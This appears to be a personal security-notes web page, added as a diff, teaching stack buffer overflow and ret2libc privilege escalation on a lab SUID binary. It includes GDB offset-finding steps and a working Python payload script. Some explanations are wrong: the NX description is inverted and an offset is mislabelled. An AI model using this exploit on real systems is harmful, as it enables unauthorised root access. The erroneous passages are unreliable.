@@ -1,0 +1,126 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Maven+Pro:wght@400..900&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="/H4ckV4ult/styles/navBarStyles.css">
+    <link rel="stylesheet" href="/H4ckV4ult/styles/walkthroughs.css">
+        <link href="/H4ckV4ult/styles/prism/prism.css" rel="stylesheet" />
+    <script src="/H4ckV4ult/styles/prism/prism.js"></script>
+    <title>Minimalist Webpage</title>
+
+</head>
+<body>
+    <div id="navbar-container"></div>
+    <script src="/H4ckV4ult/components/navbar.js"></script>
+
+    <div class="notion-container">
+        <div class="notion-header">
+            <h1>BufferOverflow</h1>
+            <p>Also known as a buffer overrun, buffer overflow occurs when the amount of data in the buffer exceeds its storage capacity. That extra data overflows into adjacent memory locations and corrupts or overwrites the data in those locations</p>
+        </div>
+
+        <div class="notion-body">
+            <h2>Interesting files</h2>
+            <ul>
+                        <p>In some cases you may find a binary that may be exploitable using buffer overflow. Normaly those binaries contain SUID so you can escalate your privileges</p>
+                        <p>First of all we must check the architecture of machine since based on that we can focus the attack</p>
+
+                        <p>Normally the first thing to try is to introduce a lot of junk in the input a look if the program crashes. But why is that? </p>
+                        <img style="border: 1px solid;" src="/H4ckV4ult/images/protocolsImages/bufferoverflow.png">
+                        <p>Here you have a mmemory schema, every empty block represents a memory direction. When you introduce chracters in the input of the binary,  a memory direction is filled. </p>
+                        <p>In case you introduce a lot of them, registers like EBP or RET (Register that points to the following address memory that will be executed) which are important can be overwritten </p>
+                        <p>Since the value of EIP has been replaced with <b>AAAA (junk) which equals 0x41414141</b> the result is a segmentation fault since that address (0x41414141) not exists. The ojective here is to setup a direction that it exists and inside that direction introduce instructions that able you to scalate privielges</p>
+                        <p>There are many techniques about buffer overflow. But after doing anythin we must</p>
+
+                        <ul>
+                            <li>Transfer the file to your machine</li>
+                            <li>First check which kind of binary it is 64 or 32 bits</li>
+                            <pre><code class="language-bash">file binaryname</code></pre>
+                            <li>Check if the file has protections</li>
+                            <pre><code class="language-bash">checksec --file=rop
+RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable     FILE
+Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   73 Symbols        No    0               2               rop</code></pre>
+                            <p>If NX enabled (non executable) which means that when you as an attacker control the the flow you can point the ESP where you trash (AAAA) is located but you can also introduce what's called a <b>shellcode</b> which is basically code that can be executed in low level.</p>
+                            
+                        <h3>NX enabled</h3>
+                        <ul>        
+                            <p>Pending to document situations when NX is enabled</p>        
+                        </ul>
+
+                        <h3>Retolibc (Return to libc)</h3>
+                        <ul>
+                            <p>This means. We don't access the stack instead the perform a system call. So when to take control of RET you need to point to </p>
+                            <p>The goal here is to obtain the following</p>
+                            <p><b>ret2libc → system_addr + exit_addr + bin_sh_addr</b></p>
+                            <h4>Checking</h4>
+                            <ul>
+                                <p>There is a another check. Is ASLR enabled? Meaning that memory directions are radom</p>
+                                <pre><code class="language-bash">cat /proc/sys/kernel/randomize_va_space  - if 0 ALSR is disabled</code></pre>
+                                <p>In case it is enabled we must perform a colission attack</p>
+
+                                <p>Check which libraries uses the binary</p>
+                                <pre><code class="language-bash">www-data@frolic:/home/ayush/.binary$ ldd rop
+    linux-gate.so.1 =>  (0xb7fda000)
+    libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xb7e19000)
+    /lib/ld-linux.so.2 (0xb7fdb000)</code></pre>
+                                <p>It is very important that libc is present since all address are obtained using this library</p>
+                                <p>Also this commands provides the base address (0xb7e19000)</p>    
+                            </ul>
+
+                            <h4>Detecting the overflow</h4>
+                            <ul>     
+                                <p>But first we need to check how many chars we need to introduce for the program to crush. Using <b>GDB</b> we can find out that</p>
+                                <pre><code class="language-bash">gdb ./rop -q</code></pre>
+                                <p>Now run the program using (In that case the program needed a input so we introduced hola)</p>
+                                <pre><code class="language-bash">r hola</code></pre>
+                                <p>If we run the program passing a lot of chars we can see that <b>ebp</b> (base of the current stack) takes the value of aaaa and also and ret or eip takes the value of aaaa</p>
+                                <p>The thing here is to find how many chars the programs needs to recieve to crash. We can insert junk to do so</p>
+                                <pre><code class="language-bash">pattern create</code></pre>
+                                <p>Run the program again passing that junk and check eip value. Then to calculate how many chars you can use</p>
+                                <pre><code class="language-bash">pattern offset $eip </code></pre>
+                                <p>In case you would like to check use print -c 'print("A"*$NUMBER_OF_CHARS_YOU_THINK+"B"*4) Introduce that in the input and look if <b>$eip has BBBB</b></p>
+                            </ul>    
+                            <h4>Creation of the epxloit</h4>
+                            <ul>
+                                <p>Remember that we are getting ret2libc → system_addr + exit_addr + bin_sh_addr</p>
+                                <p>First we will get the base_addres which is the libc address. That we previously obtained <b>(0xb7e19000)</b></p>
+                                <p>System and exit addres can be obtained by using readelf</p>
+                                <pre><code class="language-bash">readelf -s /lib/i386-linux-gnu/libc.so.6 | grep -E "system@@| exit@@" 
+41: 0002e9d0    31 FUNC    GLOBAL DEFAULT   13 exit@@GLIBC_2.0
+627: 0003ada0    55 FUNC    GLOBAL DEFAULT   13 __libc_system@@GLIBC_PRIVATE
+1457: 0003ada0    55 FUNC    WEAK   DEFAULT   13 system@@GLIBC_2.0</code></pre>
+                                <p>Important thing the addresses are not the real addresse, they are objects  since we must make a operation</p>
+                                <b>0xb7e19000 (libc address) + 0003ada0 (exit offset) = real address of exit</b>
+                                <p>With both exit and system address we only need to find out bin_sh address</p>
+                                <p>Using strings we can find out the address of /bin/sh from libc library. The parameter -t is to represent data in base 16</p>    
+                                <pre><code class="language-bash">strings -a -t x /lib/i386-linux-gnu/libc.so.6 | grep /bin/sh
+15ba0b /bin/sh</code></pre>
+                                <p>Now perform the same operation with binsh offset</p>
+                                <p>Finally code the following script. As you can see address are inverted since this is 32 bits little endian</p>
+                                <pre><code class="language-python">from struct import pack
+offset = 52
+junk = "A"*offset
+
+#ret2libc -> system_addr + exit_addr + bin_sh_addr
+
+base_libc_address = 0xb7e19000
+
+system_addr = pack("&lt;I", base_libc_address + 0x0003ada0)
+exit_addr = pack("&lt;I", base_libc_address + 0x0002e9d0)
+bin_sh_addr = pack("&lt;I", base_libc_address + 0x0015ba0b)
+
+payload = junk + system_addr + exit_addr + bin_sh_addr
+print(payload)</code></pre>
+                              <p>Finally pass the string to the binary</p>
+                              <pre><code class="language-bash">./rop $(python /tmp/exploit.py)   </code></pre>
+                    </ul>
+
+                    
+        </div>
+    </div>
+</body>
+</html>
